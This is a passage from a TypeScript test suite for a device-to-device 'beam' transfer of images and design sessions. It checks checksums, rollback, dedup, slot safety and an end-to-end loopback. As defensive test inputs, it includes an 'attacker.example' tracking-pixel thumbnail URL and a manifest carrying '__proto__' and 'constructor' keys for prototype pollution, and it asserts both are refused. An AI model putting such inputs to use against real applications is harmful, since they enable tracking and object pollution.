  assert.ok(META_REJECTED_KEYS.includes('tts'), 'the rejected set is exported so the reason for each key is reviewable');
});

test('the row is named from the label the human was shown, not the manifest’s copy', async () => {
  const to = makeHost();
  const payload = pngOf(64, 66);
  const ctx = await manifestOnly(to, [{
    kind: 'asset', itemId: '1/x', sourceId: 'user/upload/x.png', label: 'invoice-final.pdf',
    bytes: payload.length, checksum: 'x', type: 'raster', format: 'png', mime: 'image/png',
  }]);
  const result = await ingestBeamItem(
    { id: '1/x', label: 'cat.png', bytes: payload.length, checksum: await sriSha256(payload) },
    new Blob([payload as unknown as BlobPart]), ctx,
  ) as { kind: 'asset'; id: string; label: string };
  assert.equal(result.label, 'cat.png');
  assert.equal(to.records.get(result.id)!.meta!.name, 'cat.png', 'the consent sheet and the library agree');
});

test('a manifest that disagrees with the offer about a size is refused', async () => {
  const to = makeHost();
  const payload = pngOf(64, 67);
  const ctx = await manifestOnly(to, [{
    kind: 'asset', itemId: '1/x', sourceId: 'user/upload/x.png', label: 'x.png',
    bytes: 999_999, checksum: 'x', type: 'raster', format: 'png', mime: 'image/png',
  }]);
  const item = { id: '1/x', label: 'x.png', bytes: payload.length, checksum: await sriSha256(payload) };
  await assert.rejects(
    () => ingestBeamItem(item, new Blob([payload as unknown as BlobPart]), ctx),
    (err: BeamPackError) => err instanceof BeamPackError && err.code === 'bad-manifest',
  );
  assert.equal(to.records.size, 0);
});

test('a session thumbnail must be a raster data-URL, or the slot arrives without one', async () => {
  const to = makeHost();
  for (const [thumb, kept] of [
    ['data:image/png;base64,QQ==', true],
    ['https://attacker.example/px.gif', false],
    ['data:image/svg+xml;base64,QQ==', false],
    [`data:image/png;base64,${'Q'.repeat(600 * 1024)}`, false],
  ] as const) {
    const data = new TextEncoder().encode(JSON.stringify({ __toolId: 'design', __label: 'S' }));
    const ctx = await manifestOnly(to, [{
      kind: 'session', itemId: '1/s', sourceId: 'design:1', label: 'S',
      bytes: data.length, checksum: 'x', toolId: 'design', thumb,
      uses: { user: [], library: [] },
    }] as unknown as BeamPackAssetEntry[]);
    const result = await ingestBeamItem(
      { id: '1/s', label: 'S', bytes: data.length, checksum: await sriSha256(data) },
      new Blob([data as unknown as BlobPart]), ctx,
    ) as { kind: 'session'; slot: string };
    assert.equal(to.sessions.get(result.slot)!.thumb, kept ? thumb : null, `thumb ${thumb.slice(0, 32)}`);
  }
});

// ── No partial ingest (section 11.18) ────────────────────────────────────────────────

test('a read-back that disagrees deletes the row it just wrote', async () => {
  const to = makeHost();
  const payload = pngOf(128, 71);
  const ctx = await manifestOnly(to, [{
    kind: 'asset', itemId: '1/x', sourceId: 'user/upload/x.png', label: 'x.png',
    bytes: payload.length, checksum: 'x', type: 'raster', format: 'png', mime: 'image/png',
  }]);
  // A store that quietly normalises on write - the exact failure the read-back exists
  // to catch, and the one that used to leave a corrupt row behind a failed beam.
  const upload = to.assets._uploadUserAsset;
  to.assets._uploadUserAsset = async (record) => upload!.call(to.assets, { ...record, blob: new Blob(['re-encoded']) });

  const item = { id: '1/x', label: 'x.png', bytes: payload.length, checksum: await sriSha256(payload) };
  await assert.rejects(
    () => ingestBeamItem(item, new Blob([payload as unknown as BlobPart]), ctx),
    (err: BeamPackError) => err instanceof BeamPackError && err.code === 'checksum-mismatch',
  );
  assert.equal(to.records.size, 0, 'the corrupt row went with the failure');
  assert.deepEqual(ctx.written, [], 'and is not left in the undo log');
});

test('a beam that fails partway can be rolled back whole', async () => {
  const from = senderHost();
  const to = makeHost();
  const built = await buildBeamOffer({ from: 'session', host: from, slot: 'design:1000', ...NO_WORKER });
  const ctx = createBeamIngest(to, { fromName: 'Priya' });

  // Manifest, photo, map, session - then the quota refusal a 38 MB pack routinely hits.
  for (let i = 0; i < 3; i++) await ingestBeamItem(built.offer.items[i]!, await payloadOf(built, i), ctx);
  await ingestBeamItem(built.offer.items[3]!, await payloadOf(built, 3), ctx);
  assert.equal(to.records.size, 2);
  assert.equal(to.sessions.size, 1);
  assert.deepEqual(ctx.written.map(w => w.kind), ['asset', 'asset', 'session']);

  const { removed, failed } = await rollbackBeamIngest(ctx);
  assert.equal(removed, 3);
  assert.equal(failed, 0);
  assert.equal(to.records.size, 0, 'no orphan rows attributed to a peer');
  assert.equal(to.sessions.size, 0);
  assert.deepEqual(ctx.written, []);
  assert.equal(ctx.rekey.size, 0, 'and nothing still points at what was undone');
});

test('a host with no delete surface reports the failure instead of claiming a clean undo', async () => {
  const to = makeHost();
  delete (to.assets as { _deleteUserAsset?: unknown })._deleteUserAsset;
  const payload = pngOf(64, 73);
  const ctx = await manifestOnly(to, [{
    kind: 'asset', itemId: '1/x', sourceId: 'user/upload/x.png', label: 'x.png',
    bytes: payload.length, checksum: 'x', type: 'raster', format: 'png', mime: 'image/png',
  }]);
  await ingestBeamItem(
    { id: '1/x', label: 'x.png', bytes: payload.length, checksum: await sriSha256(payload) },
    new Blob([payload as unknown as BlobPart]), ctx,
  );
  assert.deepEqual(await rollbackBeamIngest(ctx), { removed: 0, failed: 1 });
});

test('dedup never lands on a row the user’s library hides', async () => {
  const from = senderHost();
  const to = makeHost();
  // A frozen preservation copy (bridge/version-assets.ts) of the very bytes arriving:
  // machine-owned, hidden from Manage uploads, and reclaimable by the versioning
  // machinery - so a session re-keyed onto it would point at bytes that can vanish.
  addAsset(to, 'user/frozen/1700000000-map.png', pngOf(1500, 22), { meta: { name: 'map.png' } });

  const built = await buildBeamOffer({ from: 'session', host: from, slot: 'design:1000', ...NO_WORKER });
  const { ctx, results } = await deliver(built, to);
  const mapResult = results[2]! as { kind: 'asset'; id: string; deduped: boolean };

  assert.equal(mapResult.deduped, false, 'the frozen copy is not a library row');
  assert.ok(mapResult.id.startsWith(BEAM_ID_PREFIX), 'a real, visible row is written instead');
  assert.equal(ctx.rekey.get(MAP), mapResult.id);
});

test('bytes that do not match the checksum they were offered under never reach storage', async () => {
  const to = makeHost();
  const ctx = createBeamIngest(to, { fromName: 'Priya' });
  const item: BeamItem = { id: MANIFEST_ITEM_ID, label: 'x', bytes: 2, checksum: `sha256-${'A'.repeat(43)}=` };
  await assert.rejects(
    () => ingestBeamItem(item, new Blob(['hi']), ctx),
    (err: BeamPackError) => err instanceof BeamPackError && err.code === 'checksum-mismatch',
  );
  assert.equal(to.records.size, 0);
  assert.equal(to.sessions.size, 0);
});

test('identical bytes already here are reused - no second row, and the refs follow', async () => {
  const from = senderHost();
  const to = makeHost();
  // The receiver already owns the same map image, under an id of its own.
  const already = addAsset(to, 'user/upload/77-their-map.png', pngOf(1500, 22), { meta: { name: 'their-map.png' } });

  const built = await buildBeamOffer({ from: 'session', host: from, slot: 'design:1000', ...NO_WORKER });
  const { ctx, results } = await deliver(built, to);

  const mapResult = results[2]! as { kind: 'asset'; id: string; deduped: boolean };
  assert.equal(mapResult.deduped, true);
  assert.equal(mapResult.id, already.id, 'dedup by checksum reuses the row that was already here');
  assert.equal(ctx.rekey.get(MAP), already.id);
  assert.equal(to.uploads, 1, 'only the photo was written; the duplicate cost nothing');
  assert.equal(to.records.size, 2);

  const session = results[3]! as { kind: 'session'; slot: string };
  const saved = to.sessions.get(session.slot)!.data;
  assert.equal((saved.blocks as { image: { id: string } }[])[0]!.image.id, already.id);
});

test('a received session is always a new slot - nothing on this device is overwritten', async () => {
  const from = senderHost();
  const to = makeHost();
  const built = await buildBeamOffer({ from: 'session', host: from, slot: 'design:1000', ...NO_WORKER });

  // Freeze the clock so the slot the minter WANTS is already taken, which is the
  // collision a real double-beam produces and the one a naive `save()` would clobber.
  const realNow = Date.now;
  Date.now = () => 4242;
  try {
    await to.state.save('design:4242', { __toolId: 'design', __label: 'Mine' }, null);
    const first = (await deliver(built, to)).results[3]! as { slot: string };
    const second = (await deliver(built, to)).results[3]! as { slot: string };

    assert.notEqual(first.slot, 'design:4242');
    assert.notEqual(second.slot, first.slot);
    assert.equal(to.sessions.get('design:4242')!.data.__label, 'Mine', 'the slot that was here is untouched');
    assert.equal(to.sessions.size, 3);
  } finally {
    Date.now = realNow;
  }
});

test('an item the manifest does not describe is refused, and a future pack is refused by name', async () => {
  const to = makeHost();
  const ctx = createBeamIngest(to, { fromName: 'Priya' });
  const orphan = new Blob(['x']);
  const item: BeamItem = { id: '1/whatever', label: 'x', bytes: 1, checksum: await sriSha256(new Uint8Array([120])) };
  await assert.rejects(
    () => ingestBeamItem(item, orphan, ctx),
    (err: BeamPackError) => err instanceof BeamPackError && err.code === 'unknown-item',
  );

  const future = new TextEncoder().encode(JSON.stringify({
    format: BEAM_PACK_FORMAT, formatVersion: 9, minReader: 9, kind: 'assets', name: 'x', entries: [],
  }));
  const futureItem: BeamItem = {
    id: MANIFEST_ITEM_ID, label: 'x', bytes: future.length, checksum: await sriSha256(future),
  };
  await assert.rejects(
    () => ingestBeamItem(futureItem, new Blob([future as unknown as BlobPart]), createBeamIngest(to)),
    (err: BeamPackError) => err instanceof BeamPackError && err.code === 'bad-manifest',
  );
});

test('a hostile manifest cannot smuggle prototype keys onto a row', async () => {
  const to = makeHost();
  const payload = pngOf(64, 3);
  const ctx = await manifestOnly(to, [
    { kind: 'nonsense-from-a-newer-writer', itemId: '1/x' },
    {
      kind: 'asset', itemId: '1/x', sourceId: 'user/upload/x.png', label: 'x.png',
      bytes: payload.length, checksum: 'ignored', type: 'raster', format: 'png', mime: 'image/png',
      meta: { name: 'x.png', ['__proto__']: { polluted: true }, constructor: 'nope', keep: 'yes' },
    },
  ]);
  assert.equal(ctx.manifest!.entries.length, 1, 'an entry kind this build does not know is dropped, not fatal');

  const result = await ingestBeamItem(
    { id: '1/x', label: 'x.png', bytes: payload.length, checksum: await sriSha256(payload) },
    new Blob([payload as unknown as BlobPart]),
    ctx,
  ) as { kind: 'asset'; id: string };

  const stored = to.records.get(result.id)!;
  assert.equal(stored.meta!.keep, 'yes', 'ordinary metadata still rides along');
  assert.equal(Object.hasOwn(stored.meta!, 'constructor'), false);
  assert.equal(({} as { polluted?: boolean }).polluted, undefined, 'nothing reached Object.prototype');
  assert.deepEqual([...new Uint8Array(await stored.blob!.arrayBuffer())], [...payload], 'the file itself is untouched');
});

test('rewriteSessionAssetRefs is pure - the input is never mutated', () => {
  const data = fixtureSession();
  const before = JSON.stringify(data);
  const out = rewriteSessionAssetRefs(data, new Map([[PHOTO, 'user/beam/9-new.png']]));
  assert.equal(JSON.stringify(data), before);
  assert.equal(out.rewritten, 2);
  assert.deepEqual(out.unresolved, [MAP, GONE]);
});

// ── The two halves together ───────────────────────────────────────────────────

test('a pack survives the real protocol and lands in the receiver’s library', async () => {
  const from = senderHost();
  const to = makeHost();
  const built = await buildBeamOffer({ from: 'session', host: from, slot: 'design:1000', fromName: 'Priya', ...NO_WORKER });

  // A synchronous loopback: the sender writes, the receiver reads, no timers.
  const staged = new Map<number, Uint8Array[]>();
  const sink: BeamSink = {
    write(itemIndex, _seq, bytes) {
      const list = staged.get(itemIndex) ?? [];
      list.push(bytes);
      staged.set(itemIndex, list);
    },
    finalize() { /* sealing only - ingestion happens after `complete` (section 11.18) */ },
    discard() { staged.clear(); },
  };

  let receiver!: ReturnType<typeof createBeamReceiver>;
  const senderWire: BeamWire = {
    json: (msg: BeamMessage) => receiver.receive(JSON.parse(JSON.stringify(msg))),
    binary: (bytes) => receiver.receiveBinary(bytes),
  };
  const sender = createBeamSender({ offer: built.offer, source: built.source, wire: senderWire, chunkBytes: 1024 });
  receiver = createBeamReceiver({
    wire: { json: (msg) => sender.receive(JSON.parse(JSON.stringify(msg))), binary: () => {} },
    sink,
  });

  sender.offer();
  assert.equal(receiver.state.phase, 'offered');
  assert.equal(receiver.state.offer!.totalBytes, built.totalBytes, 'the size is disclosed before consent (section 11.24)');
  receiver.accept();
  for (let guard = 0; guard < 10_000; guard++) {
    const pulled = await sender.nextChunk();
    if (pulled === 'complete' || pulled === 'ended') break;
  }
  await receiver.drain();
  assert.equal(receiver.state.phase, 'complete');
  assert.equal(receiver.state.discarded, false);

  // Only now - after `complete` - does anything enter the library.
  const ctx = createBeamIngest(to, { fromName: 'Priya' });
  const landed = [];
  for (let i = 0; i < built.offer.items.length; i++) {
    const parts = staged.get(i) ?? [];
    landed.push(await ingestBeamItem(built.offer.items[i]!, new Blob(parts as unknown as BlobPart[]), ctx));
  }

  assert.equal(landed[0]!.kind, 'manifest');
  const session = landed[3]! as { kind: 'session'; slot: string };
  const saved = to.sessions.get(session.slot)!.data;
  assert.equal(saved.__label, 'Berlin poster (from Priya)');
  const photoId = (landed[1]! as { id: string }).id;
  assert.equal((saved.photo as { id: string }).id, photoId);
  const outBytes = new Uint8Array(await to.records.get(photoId)!.blob!.arrayBuffer());
  const inBytes = new Uint8Array(await from.records.get(PHOTO)!.blob!.arrayBuffer());
  assert.deepEqual([...outBytes], [...inBytes], 'byte-exact end to end, through the wire');

  built.dispose();
});
